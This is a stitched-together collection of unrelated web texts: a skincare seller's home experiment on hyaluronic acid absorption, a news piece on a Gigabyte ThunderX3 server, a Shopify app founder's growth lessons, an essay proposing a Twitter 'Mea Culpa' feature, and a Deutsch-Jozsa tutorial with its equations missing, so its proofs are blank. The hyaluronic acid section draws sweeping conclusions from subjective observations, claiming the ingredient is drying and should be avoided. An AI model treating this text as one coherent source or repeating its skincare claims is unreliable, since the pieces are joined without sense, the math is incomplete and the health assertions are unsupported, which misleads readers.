<p>Hyaluronic acid high molecular weight (HMW): 1.0-1.5 million daltons</p>
<p>Hyaluronic acid low molecular weight (HLW): 0.8-1.0 million daltons</p>
<p>Hyaluronic acid super low molecular weight (HSLMW): &lt;50,000 daltons</p>
<p>Hyaluronic acid ultra low molecular weight (HULMW): &lt;6,000 daltons</p>

<p>Distilled water</p>

<h4>Experimental methods and results</h4>
<p>The first part of the experiment, I went right to the claim that hyaluronic acid absorbs 1000x its weight in water. I weighed out 1g of HA for all molecular weights (HMW, HLW, HSLMW, HULMW) and placed this in 1000g of distilled water.</p>
<p><img src="https://cdn.shopify.com/s/files/1/0108/5243/3978/files/IMG_0202_large.JPG?v=1585939704" alt="">Â&nbsp;<img src="https://cdn.shopify.com/s/files/1/0108/5243/3978/files/IMG_0201_large.JPG?v=1585939693" alt=""></p>
<h6>Pictured here is 1g of HA and 1000g of water (quarter shown for scale). As you can see it is a bold claim to state that such a small amount of HA can absorb that much water. Experimentally, this would mean that the HA would turn the water into a thick gel when added. This did not happen.</h6>
<p>Â&nbsp;</p>
<p>I then let the mixture sit for two days to allow for total absorption to occur.</p>
<p>After two days the mixture looked no different than regular water. There was no discernible change in thickness. I filtered out the mixture to determine if any gel had formed, indicating absorption and no gel was obtained.</p>
<p>This means that hyaluronic acid did not absorb 1000x its weight in water. It did not even come close enough to that figure to be measured.</p>
<p>I repeated the above protocol for 500x HA's weight in water, 250x its weight in water and 100x its weight in water. At 100x its weight in water, there was some thickening of the water for HMW, HLW and HSLMW, but not for HULMW. These findings indicate that HA was beginning to show saturation, but this is 10x less than the claims of 1000.Â&nbsp;</p>
<p>When HMW, HLW and HSLMW was put in 50x its weight in water, a semi-thick gel (hair-gel consistency) formed. However, this was not how HA is supposed to look when fully saturated, indicating it was not able to fully absorb 50x its weight in water. Therefore I had to add less water to the mixture to determine HA's saturation point. It is also important to note that the gel thinned after day 2 and someÂ&nbsp; water precipitated to the top, indicating that some of what HA absorbed was later lost.</p>
<p><img src="https://cdn.shopify.com/s/files/1/0108/5243/3978/files/IMG_0194_large.JPG?v=1585939657" alt=""></p>
<h6>Gel pictured here formed at 50x weight in water, however the thinness of the gel indicated that HA was not able to fully absorb all of the water in its environment.Â&nbsp;</h6>
<p>The next step was to put HMW, HLW and HSLMW in 10x its weight in water. It was at this point that a fully saturated gel formed. This gel was dense, and had the properties of HA when fully saturated. It was only at this time that gel clumps were formed in the water, and could be decanted and weighed to determine how much HA was actually able to absorb.</p>
<p><img src="https://cdn.shopify.com/s/files/1/0108/5243/3978/files/IMG_0199_large.JPG?v=1585939670" alt=""></p>
<h6>This gel, obtained by putting HA in 10x its weight in water had the thickness consistent with fully saturated hyaluronic acid.Â&nbsp;</h6>
<p>Â&nbsp;</p>
<p>This experiment told me that hyaluronic acid does not hold 1000x its weight in water, but it also told me something far more important. This experiment told me that there isn't sound scientific protocol for determining how much water hyaluronic acid is capable of absorbing. There was a varying degree in the thickness of the gels depending on how much water was added, and there wasn't a point in any of the experiments where I could subjectively and definitively determine where hyaluronic acid was fully saturated. A gel only started to form around the 50x its weight point, and the gel seemed to be fully saturated only around the 10x its weight point. The problem here is that it is fully up to the researcher to give a ballpark estimate based on their own perception to determine how much of hyaluronic acids weight it is actually able to absorb in water. That means that the science behind hyaluronic acid's absorption claims is somewhat dubious.Â&nbsp;</p>
<p>At the end of the day, it does not really matter how much water hyaluronic acid can absorb, from a skin care standpoint, because it is an ingredient that should be avoided due to its drying effect. It doesn't absorb into the skin and plump it, so who cares if it can absorb 10x its weight or 1000x its weight. Its all meaningless.</p>
<p>But what does matter is that a claim that has been parroted by every skin care company who uses it is completely false. And whats worse is thatÂ&nbsp;unsubstantiated hearsay is being passed off as scientific, and is repeated so often people take it at face value without any further research. None of these companies did their own research to back up the claim. They just repeated it and deceived everyone. Nothing about that is scientific.Â&nbsp;</p>
<p>It is about time that the real science stands up.</p>

            <!-- content --><p>With Computex 2020 canceled, companies are trying to come up with ways to get their message out. At the Gigabyte Virtual Show 2020, the company has a few interesting products in their showcase and we wanted to highlight two of them. First, Gigabyte has the first (that we have seen) announced Marvell ThunderX3 server.<span id="more-44952"></span></p>
<h2>Gigabyte Marvell ThunderX3 Server</h2>
<p>Marvell ThunderX3 is the company’s next-gen server CPU. You may have seen Patrick, our editor-in-chief, speak at the&nbsp;<a href="https://www.servethehome.com/cavium-thunderx2-review-benchmarks-real-arm-server-option/">Cavium ThunderX2</a> launch that went live with our review. We also were early to the Arm server space with one of the first reviews of the original <a href="https://www.servethehome.com/cavium-thunderx-micro-benchmarks-enterprise-arm-developers-need-machines/">Cavium ThunderX</a>. A few month ago, we had an update on the <a href="https://www.servethehome.com/marvell-thunderx3-arm-server-cpu-with-768-threads-in-2020/">Marvell ThunderX3</a> without specifics. It seems that Gigabyte is showing off its next-gen ThunderX3 server already.</p>

<p>Here are the key specs that Marvell has disclosed:</p>

<p>From the video, we can see that the new Gigabyte R282 servers (2U) have a proprietary motherboard with LGA4564 which means we can expect a dramatically larger pin footprint to accompany more I/O.</p>
<figure id="attachment_44955" aria-describedby="caption-attachment-44955"><a href="https://www.servethehome.com/?attachment_id=44955" rel="attachment wp-att-44955"><img src="https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Overview.jpg" alt="Gigabyte R282 ThunderX3 Series Overview" width="2045" height="1152" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Overview.jpg 2045w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Overview-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Overview-800x451.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Overview-1536x865.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Overview-696x392.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Overview-1068x602.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Overview-746x420.jpg 746w" sizes="(max-width: 2045px) 100vw, 2045px"></a><figcaption id="caption-attachment-44955">Gigabyte R282 ThunderX3 Series Overview</figcaption></figure>
<p>The&nbsp;Gigabyte R282 platform is using a proprietary motherboard. Our sense is that it is designed for not just this 2U form factor but also 1U-4U servers as well depending on the add-in card configuration. Gigabyte is also showing off NVIDIA V100 support. This is a big push by NVIDIA and Arm as we saw in <a href="https://www.servethehome.com/nvidia-cuda-on-arm-becoming-a-reality/">NVIDIA CUDA on Arm Becoming a Reality</a>.</p>
<figure id="attachment_44954" aria-describedby="caption-attachment-44954"><a href="https://www.servethehome.com/?attachment_id=44954" rel="attachment wp-att-44954"><img src="https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Rear.jpg" alt="Gigabyte R282 ThunderX3 Series Rear" width="1975" height="1056" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Rear.jpg 1975w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Rear-400x214.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Rear-800x428.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Rear-1536x821.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Rear-696x372.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Rear-1068x571.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Rear-786x420.jpg 786w" sizes="(max-width: 1975px) 100vw, 1975px"></a><figcaption id="caption-attachment-44954">Gigabyte R282 ThunderX3 Series Rear</figcaption></figure>
<p>Since we have tested Gigabyte servers in both the ThunderX and ThunderX2 generations, we hope to get to check out the ThunderX3 variants soon. Gigabyte currently has other R282 servers such as those that are <a href="https://www.servethehome.com/amd-epyc-7002-series-rome-delivers-a-knockout/">AMD EPYC 7002 “Rome”</a> based, and we saw an Ampere-based server that looked like it was based on a similar platform. As a result, it seems as though Gigabyte is trying to use a common chassis or similar chassis with different architectures to build a larger product line. This is the ThunderX3 offering in that line.</p>
<h2>Final Words</h2>
<p>With this solution, Gigabyte and Marvell are targeting HPC and cloud computing industries. There are other Arm server vendors such as&nbsp;<a href="https://www.servethehome.com/ampere-altra-max-targets-a-128-core-arm-cpu-shipping-in-2021/">Ampere</a> focused on cloud-first Arm chips. Gigabyte is very open exploring new server architectures which is why it has a robust AMD EPYC line as well as a line of Ampere Altra servers we saw <a href="https://www.servethehome.com/ampere-altra-q80-30-in-action-at-ampere-hq/">in Action at Ampere HQ</a> pre-lockdown.</p>
<p>We still have several months until the next x86 server platform launch. In the meantime, expect Gigabyte with its partners such as Marvell to turn up their efforts marketing their new cloud servers. Intel’s 10nm delays have opened the door to a host of new competitors that have AMD EPYC Rome-like features such as 8-channel DDR4-3200 and PCIe Gen4 well before Intel will release Ice Lake Xeon platforms.</p>
<p>A big part of Gigabyte’s server strategy is embracing new and diversified architectures. That is part of the reason they have their <a href="https://www.gigabyte.com/Events/virtualshow">virtual event online</a>. Their goal is to provide access to Gigabyte staff as one would at the Computex trade show. Given travel and trade show challenges this year, Gigabyte is using the online format.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>14 months ago, my co-founder <a href="https://twitter.com/sankalpjonna" target="_blank">Sankalp</a> and I set out to build a business that can sustain our livelihood while allowing us the freedom to live life on our terms. </p><p>When we started, we each had roughly 12 months of savings to survive on, assuming we made $0. Hence our minimum goal was to make $1,500/mo and the case where we would be celebrating with champagne was set to $3,000/mo.</p><p>We launched our app on April 24, 2019. The first paid plan was launched on June 4, 2019. Around the same time, we got <a href="https://www.preetamnath.com/blog/shopify-micro-saas-growth" target="_blank">featured by Shopify</a>. Here's a <a href="https://apps.shopify.com/whatsapp-chat-button" target="_blank">link to the app</a> if you want to check it out.</p><p>14 months later, we grew past $25,000 in MRR while remaining a 2 person team.</p><figure id="w-node-e5ce9f7f0ba4-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004959a0b62d53946fd901_shopify%20earnings%20growth.png" alt=""></p><figcaption><em>Note:&nbsp;Earnings reflect after a 1 month delay</em></figcaption></figure><p>I’m so proud of what we have built here.</p><p>If life is a video game, and there’s 100 levels to it, I feel like we have finally crossed level 1.</p><p>Here's what we've been up to in the 14 months since launch:</p><ul role="list"><li>20,000 active merchants (users) on the app</li><li>1,500+ paying merchants (customers)</li><li>450,000 automated WhatsApp messages sent in June</li><li>2.2 million WhatsApp chat messages initiated in June</li><li>Highest rated 5.0 🌟 app for all things WhatsApp with 500+ reviews</li><li>Users from 50+ countries around the world</li></ul><figure id="w-node-0cd8870c808c-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f007ba5d6c3b3532b0aa784_paying%20customers%20countries.png" alt=""></p></figure><p>We did a lot of things right, but we also messed up here and there. I've tried to capture an honest and accurate account of our journey so far.</p><h2>11 key learnings and mistakes from our journey<br></h2><h3>1- Learning: Always keep moving the needle</h3><p>Running your own business and having 100% freedom and flexibility is a gift or a curse, depending on how you use it. It’s easy to get lost in building, polishing, bringing your ideas to life. But remember, the only things that matter are what move the needle. </p><p>For every decision related to your business, you should always run it through a set of questions that help you filter out whether your idea is aligned to your business goals.</p><ul role="list"><li>Does it help our app get more users</li><li>Does it help convert more users to paying customers</li><li>Does it help users derive more value and ROI from the app</li><li>Does it meaningfully improve user experience</li><li>Does it reduce our support ticket load</li><li>Does it have any unintended 2nd order consequences that can bite us later</li></ul><p>Ultimately, you want to keep making decisions that move the needle for your business - by bringing you more customers and revenue, or making it easier and less time consuming to run the business (if that’s one of your goals, it is for us).<br></p><h3>2- Learning: Help users realise value as soon as possible</h3><p>From our research, we learnt that Shopify merchants are mostly solopreneurs or teams of 2-10. They are always time and resource crunched.</p><p>We wanted to enable our users to start using the app with the least amount of setup time or steps. This reflects in in the user experience of the app. </p><p>For example, when a first time user enters their phone number and hits the “Save” button, at this time the user is looking to test our app and see if it fits their needs. We speed that up by&nbsp;automatically enabling the chat button on first save, along with the best default configuration for all chat button related settings.</p><figure id="w-node-4b9a52f7ced2-2f0d8df6"><p><iframe allowfullscreen="true" frameborder="0" scrolling="no" src="https://www.youtube.com/embed/o3oeGyv-JJs"></iframe></p></figure><p>Another example, when a user wants to start sending automated messages, all they have to do is click on the “Enable” button. All the app’s default configuration is automatically applied and the user can start seeing value immediately.</p><figure id="w-node-4bee860d412d-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004a6e594ffa16384d47ca_automated-message-setup-1.png" alt=""></p></figure><figure id="w-node-8c9743f7a3e0-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004a858d5f7ceaad74de97_automated-message-setup-2.png" alt=""></p></figure><h3>3- Learning: Care about your users, they can feel it</h3><p>Users are on a mission to achieve their goals. They typically need your help when there’s something that stops them from getting there.</p><p>From day 1, we were clear on providing the best possible support. Our users would be thrilled to see bug fixes deployed in 15 minutes, WhatsApp &amp; email replies in 5 minutes, and so on. We were fast, we were responsive.</p><p>This worked in our favour - users showered us with positive reviews which is how we managed 500+ reviews while staying 5.0 star rated.</p><figure id="w-node-f55f45993a1f-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004affbd3802acac60056d_superlemon%20whatsapp%20app%20shopify%20reviews.png" alt=""></p></figure><p>But customer support isn’t only about getting reviews. We’ve had users who prefer using our app instead of competitors because</p><p><strong>A-</strong> We reply quickly</p><p><strong>B-</strong> We proactively provide information beyond the immediate premise of the query</p><figure id="w-node-e499fce41f50-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f0065d67e883834a7802cc8_review-users-care.png" alt=""></p><figcaption><em>Your users can feel when you genuinely care about them</em></figcaption></figure><h3>4- Learning: Be smart about managing and reducing support ticket volume</h3><p>The downside of trying to be a customer support hero is, you only have finite hours in the day, and you don’t want to spend most of it replying to customers. </p><p>We took 3 specific initiatives to reduce support tickets.</p><p><strong>1- Embed FAQs within the product</strong></p><p>We found that users would have FAQs around specific features, and they wouldn’t really go to the help center and reference it. To them, it’s simpler to ask for help.</p><p>To solve this problem, we embedded FAQs inside the product itself. </p><p>Here are a few examples where we included the most commonly asked question beside the feature configuration. </p><figure id="w-node-1def5927520e-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004c97d6c3b3b5f30a4556_faq-inside-product-1.png" alt=""></p></figure><figure id="w-node-11706312cf8a-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004ca08216b9c33aaef853_faq-inside-product-2.png" alt=""></p></figure><figure id="w-node-9239f016ade1-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004ca87bc6f87761475470_faq-inside-product-3.png" alt=""></p></figure><p>The results were always immediately noticeable. Where we would get 10 questions a week about X, would drop to 1-2, thereby freeing us up from answering repetitive support questions.</p><p><strong>2- Fix repetitive bugs</strong></p><p>If a bug appears more than thrice in a span of days, the third time is when we go ahead and permanently fix it. Why thrice? That way we don’t overwhelm ourselves with trying to fix every single bug, but only the ones that appear repeatedly and take up support time.</p><p><strong>3- Remove WhatsApp chat support and go with Email only</strong></p><p>During initial days, we found it useful to let our users contact us on WhatsApp. It lead to tons of conversations which shaped our understanding of the user’s needs and how we can better solve them. </p><p>But having WhatsApp as a support channel had 3 issues:</p><p><strong>1-</strong> With time, we discovered that people find dropping a message on WhatsApp to be very low barrier. Which means they wouldn’t take a moment to look around, be patient enough to find out how the issue that they are about to describe has already been solved inside the app. It’s just easier to WhatsApp us.</p><p><strong>2-</strong> We also discovered that users had an unrealistic expectation of quick replies and quick resolutions on WhatsApp. Granted, we would be quick whenever possible. But if it’s 11pm at night and the user asks if a bug is fixed 10 minutes later, it can get a bit annoying.</p><p><strong>3-</strong> I started dreading picking up my phone, seeing it full of support tickets every morning.</p><p>To solve this, we removed the WhatsApp chat button from our own app, and replaced it with an Email support button instead. All 3 problems listed above got resolved to a great degree.</p><figure id="w-node-09f7b09a3b19-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004d01e45cb8848d6cf0f7_Email%20support%20only.png" alt=""></p></figure><p>We also made numerous smaller tweaks to optimise our support flow. One of the tiny but powerful tweaks was to automatically populate the email subject line with the user’s Shopify store url. That made it so much faster for us to look up the specific user instead of a meaningless back and forth of “what’s your store url”.</p><figure id="w-node-280b459e613d-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f00533cbd380208b160157f_store%20url.jpg" alt=""></p></figure><p>Our efforts have paid off. Unless we’re building new features, we spend only about <strong>15-30 minutes per day</strong> on customer support.<br></p><h3>5- Learning: Say No, often</h3><p>Users ask for all sorts of functionality. It doesn’t mean you should build them. </p><p>Whenever we get feature requests, we add a card in our internal Notion board and judge the card against 3 factors</p><p><strong>1-</strong> how many times do we receive the same request</p><p><strong>2-</strong> does the feature align with the rest of our product</p><p><strong>3-</strong> does the feature add core value to the user</p><p>Many times, we found users requesting features that would save them the hassle of using another app. Now, if that functionality enhances the rest of our app, it’s the right feature to add. But if it doesn’t, then we politely decline.</p><figure id="w-node-2831ff295f9b-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f00517014696c60a040b940_politely%20saying%20no.png" alt=""></p></figure><p>There are 2 types of responses we give to customers regarding feature requests:</p><p><strong>1-</strong> Tell them that this feature isn’t requested by other users that much, and since we are a small team with limited resources, we may not be prioritising this feature in the near future.</p><p><strong>2-</strong> Tell them that this feature is already part of our roadmap, and that we will reach out to them whenever it’s ready. I generally avoid giving timelines, to account for “life happens, plans change”.</p><p>This learning extends beyond just feature requests. </p><p>In the past year, we have received tons of business proposals, partnerships, integration requests, collaborative marketing invitations etc. Saying No allowed us to remain focused on what’s really important.<br></p><h3>6- Mistake: Optimise top of the funnel</h3><p>I was under the impression that during build phase, we shouldn’t focus too much on optimisation. After all, you don’t want to get busy squeezing another 10% when the potential is to 10x. </p><p>In most cases, I think I made the right call. One place I made the wrong call was the user onboarding flow.</p><p>Until March 2020, users would install the app and directly land on the chat settings page, which is the starting point of the user’s journey. We were getting a steady flow of 10-15 paid trials initiated per day. </p><p>Adding a step of friction before this would be counterintuitive, right? It couldn’t possibly increase trials, right?</p><p>Sigh. </p><p>When we added one screen which asked the user upfront whether they want to continue with the Free plan, or start a trial for the Paid plan, daily paid trials DOUBLED overnight, while trial-to-paid conversion rate remained steady at 50%. </p><figure id="w-node-c2d582bcc858-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004d9fda26a209aa082a72_onboarding%20trial%20doubled.png" alt=""></p></figure><p>The experiment took us a day to build, and after a week we concluded what was clearly the winner.</p><p>I normally advocate for focusing on building vs optimising in the early stages, but in this case I didn’t know that optimisation was waiting to unlock 100% increase in trials.</p><p>My takeaway here is - always keep your eyes open for bottlenecks at the top of funnel. </p><p>If there’s copy on your website, or a specific sign up flow that might be holding you back from getting 2x the users, you need to unblock it early and realise compounded gains over time.<br></p><h3>7- Mistake: Competition will copy, don’t completely ignore them</h3><p>In the past year, we’ve seen competitors copy our app interface, in-app descriptions, button designs, app listing text word-for-word in many cases. Initially we were furious, but instead we kept our head down and focused on customer’s needs. </p><p>Eventually we started ignoring our competitors, which was a mistake. While …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <p>Social media has a conflict problem.</p><p>Spending even a few minutes on public social media can expose us to dozens of people we know little about, talking about things we know little about. In such a public place, any individual's reputation, perspectives, and history are difficult to ascertain, and therefore their words must be taken at face value. Coupled with an almost complete lack of standards for participation in the community and a high degree of variance in knowledge among participants, and the environment naturally skews toward conflict and tribalism.</p><p>One particular effect of this environment is that small misunderstandings, mistakes, or disagreements can unexpectedly explode due to the public nature of discourse and assumptions of bad faith. Meanwhile, very few tools exist to moderate these effects.</p><!--kg-card-begin: markdown--><p>This is why it's my belief that <mark>as designed today, social media is out of balance</mark>. It is far easier to escalate than it is to de-escalate, and this is a major problem that companies like Twitter and Facebook need to address.</p>
<!--kg-card-end: markdown--><p>This got me thinking about what particular use cases need de-escalation, and whether there's something simple we can do to test the waters and address these types of problems. </p><h2 id="target-use-case-admitting-mistakes">Target Use Case: Admitting Mistakes</h2><p>One obvious issue is that <strong>people are wrong about a lot of things, but struggle to admit their mistakes</strong>. This is why many cultures have created elaborate norms around face-saving. Unfortunately, social media largely lacks these cultural norms, and even makes the problem worse in three ways:</p><ol><li><strong>No social proof</strong> - Admitting mistakes is quite difficult if nobody else is seen (genuinely) admitting mistakes, as we rely heavily on social proof to sense-make around norms. An escalation-oriented culture means there's less genuine "I was wrong" on social media than there should be.</li><li><strong>No respite</strong> - as the visibility of a mistake travels across social media, the poster is subject to a constant deluge of new readers calling them out, with the combined energy of the outraged far exceeding that of the poster. This prevents them from having the necessary emotional cool-down period to respond thoughtfully.</li><li><strong>Digging in</strong> - when feeling personally attacked, its human nature to prefer to dig in rather than apologize. Social media's escalation-oriented culture plays into this human fallibility.</li></ol><p>Take Twitter as an example environment. If we write something that turns out to be wrong and a pile-on begins, we're going to be swimming upstream fighting it. Our options are:</p><ol><li><strong>Ignore</strong> replies and hopefully let it die out</li><li><strong>Delete</strong> your tweet, posting another tweet saying "I was wrong"</li><li><strong>Reply</strong> to your tweet, posting "I was wrong"</li></ol><p>However, none of these are great. If we ignore<strong><em> </em></strong>replies, the simple amplification effects of likes, replies, retweets, and subtweets leave us exposed and the situation can get out of hand. If we delete and post another, people are unlikely to see our follow-up, as corrections are rarely viral. Similarly, even if we reply, only our viral mistake will be seen in the feed of others. </p><p>Let's also not forget the human tendency to not fully walk back statements, and instead offer unsatisfying explanations that can accidentally further enflame situations. Blaming, justifying, minimizing, or excusing are all self-sabotaging ways that people qualify their apologies to preserve their self-esteem or resolve their own cognitive dissonance, and social media is right there ready to give us this kind of rope to hang ourselves with when we're under assault.</p><!--kg-card-begin: markdown--><p>In all these cases, a person's reputation in the minds of others is damaged because <mark>social media engagement engines favor the drama of the mistake over the correction and reconciliation</mark>, which leads few people to see or remember anything other than the mistake.</p>
<!--kg-card-end: markdown--><p>This seems like a perfect use case to design for, so I came up with a little design change I call the Twitter Mea Culpa.</p><h2 id="design-exploration-twitter-mea-culpa">Design Exploration: Twitter Mea Culpa</h2><p>Twitter Mea Culpa is a way for a poster to flag their tweet as a mistake and de-escalate a situation, using the same action menu that deleting a post uses, and the same visual design as flagged tweets:</p><figure><img src="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Blue-w-Menu-NoLabel-1.png" alt="" srcset="https://nickpunt.com/content/images/size/w600/2020/07/TwitterMeaCulpa-Blue-w-Menu-NoLabel-1.png 600w, https://nickpunt.com/content/images/size/w1000/2020/07/TwitterMeaCulpa-Blue-w-Menu-NoLabel-1.png 1000w, https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Blue-w-Menu-NoLabel-1.png 1260w" sizes="(min-width: 720px) 720px"><figcaption>Twitter Mea Culpa: flagging a post as a mistake</figcaption></figure><h3 id="clear-language">Clear Language</h3><!--kg-card-begin: html--><figure><a href="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Language-1.png"><img src="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Language-1.png" alt="" srcset="https://nickpunt.com/content/images/size/w600/2020/07/TwitterMeaCulpa-Language-1.png 600w, https://nickpunt.com/content/images/size/w1000/2020/07/TwitterMeaCulpa-Language-1.png 1000w, https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Language-1.png 1198w" sizes="(min-width: 720px) 720px"></a><figcaption>Language:<em> @user has indicated they made a mistake in this tweet</em></figcaption></figure><!--kg-card-end: html--><p>I picked this language carefully for several reasons:</p><ol><li>Create separation between the individual and what they say (the specific post), which reduces ego threat.</li><li>Use an active voice to indicate responsibility (<em>I made a mistake</em> not <em>Mistakes were made</em>).</li><li>Indicate the poster was the one who chose to flag the post, not Twitter or any other user, to reduce the impression to other users that the poster was censored.</li><li>State the mistake unequivocally and leaving no room for ambiguity about whether it is actually a mistake, to reduce inauthentic use and self-sabotage.</li><li>Avoid direct use of 'sorry' or 'I apologize' language, because for some people these words are extremely <a href="https://www.psychologytoday.com/us/blog/the-squeaky-wheel/201305/5-reasons-why-some-people-will-never-say-sorry">emotionally challenging</a> to use.</li></ol><h3 id="disable-amplification">Disable Amplification</h3><!--kg-card-begin: html--><figure><a href="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Amplification-1.png"><img src="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Amplification-1.png" alt="" srcset="https://nickpunt.com/content/images/size/w600/2020/07/TwitterMeaCulpa-Amplification-1.png 600w, https://nickpunt.com/content/images/size/w1000/2020/07/TwitterMeaCulpa-Amplification-1.png 1000w, https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Amplification-1.png 1262w" sizes="(min-width: 720px) 720px"></a></figure><!--kg-card-end: html--><p>Much like rules violations, once a user admits a mistake, the Mea Culpa tweet is no longer amplified. This means:</p><ul><li>The tweet is no longer made visible on everyone's home feed</li><li>Users cannot reply, like, or retweet without comment</li><li>Users may retweet <em>with</em> comment, to allow users to amplify the correction (e.g. <em>I thought this wasn't the case, looks like they realized it</em>)</li></ul><!--kg-card-begin: markdown--><p>By admitting a mistake, the poster stops the runaway train of replies and amplifications of their mistake, and the reputation damage that follows. In other words, <mark>Mea Culpas are intentionally designed to favor respectful debate and ability to cool off over maximal information exchange</mark>.</p>
<!--kg-card-end: markdown--><figure><img src="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-ExampleViolation.png" alt=""><figcaption>How Twitter handles rules violations today; notice the lack of like/reply/retweet counts</figcaption></figure><p>This amplification disabling is how rules violations work today.

      <h3 id="introduction">Introduction</h3>

<p>In the previous <a href="https://leimao.github.io/blog/Deutsch-Algorithm/">blog post</a>, I discussed the Deutsch’s algorithm which determines whether the function $f(x)$ is balanced or constant by running $f(x)$ once using quantum circuits, where $f(x)$ maps from the set $\{0,1\}$ to the set $\{0,1\}$. However, using classical circuits, we are able to determine whether the function $f(x)$ is balanced or constant by running $f(x)$ twice. It might seem to some people that the improvement is not significant for this particular simple problem.</p>



<p>Let’s change the problem setting to a similar but more sophisticated one. Instead of taking one single bit as input, $f(\mathbf{x})$ now takes $n$ bits as input. Now, $f(\mathbf{x})$ maps from the set $\{0,1\}^n$ to the set $\{0,1\}$. The number of different inputs to $f(\mathbf{x})$ is $2^n$. We call the the function $f(\mathbf{x})$ balanced if $f(\mathbf{x}) = 0$ for exactly $2^{n-1}$ of all the different inputs, and $f(\mathbf{x}) = 1$ for the rest of the inputs. We call the function $f(\mathbf{x})$ constant if $f(\mathbf{x}) = 0$ for all different inputs, or $f(\mathbf{x}) = 1$ for all different inputs. $f(\mathbf{x})$ could be neither balanced or constant, but in this particular problem, we assume the $f(\mathbf{x})$ we are investigating must be either balanced or constant. It should be noted that it is a more general case for the problem that the Deutsch algorithm was trying to solve. When $n=1$, it decays to the problem that the Deutsch algorithm was trying to solve.</p>



<p>With classical circuits, what is the minimum and maximum number of runs to determine whether $f(\mathbf{x})$ we are investigating must be either balanced or constant? We have $2^n$ different inputs to test for this binary classification problem. In the worst scenario, we could run into the situation that the first $2^{n-1}$ inputs we tested produce all $0$s or all $1$s. Then the $2^{n-1} + 1$th input we tested must tell us whether $f(\mathbf{x})$ could be neither balanced or constant. For example, if the first $2^{n-1}$ inputs we tested produce all $0$s, if the $2^{n-1} + 1$th input we tested produces $0$, then $f(\mathbf{x})$ is constant; if the the $2^{n-1} + 1$th input we tested produces $1$, then $f(\mathbf{x})$ is balanced. In the best scenario, we got both $0$ and $1$ in the first two runs, we immediately know $f(\mathbf{x})$ is balanced.</p>



<p>With quantum circuits, can we do better and how much can we do better? In fact, there is a Deutsch-Jozsa algorithm, a derivative of the Deutsch algorithm, which solve the problem using exactly one run. If you compared to the worst case using classical circuits, it is $2^{n-1} + 1$ times faster asymptotically, which is significant when $n$ is large.</p>



<p>In this blog post, I would like to discuss the Deutsch-Jozsa algorithm. It would be recommended if the reader could read the blog on <a href="https://leimao.github.io/blog/Deutsch-Algorithm/">Deutsch algorithm</a> first, although this blog post should be mostly self-contained.</p>

<h3 id="prerequisites">Prerequisites</h3>

<h4 id="reducing-sum-or-difference-to-boolean">Reducing Sum or Difference to Boolean</h4>

<p>If $x$ and $y$ are binary values, $x, y \in \{0, 1\}$, we have</p>



<p>where $\oplus$ is $\text{XOR}$ (binary addition modulo 2). This could be easily verified using truth table.</p>

<h4 id="distributivity-of-xor">Distributivity of XOR</h4>

<p>If $x$, $y$, and $z$ are binary values, $x, y, z \in \{0, 1\}$, we have</p>



<p>I did not find a proof from the Internet so I derived a proof here. The proof is a little bit complicated and requires to use boolean algebra.</p>



<p>It is easy to verify using truth table that</p>



<p>Using the basic <a href="https://en.wikipedia.org/wiki/Boolean_algebra#Laws">boolean algebra</a>, we have</p>





<p>Therefore,</p>



<p>This concludes the proof.</p>

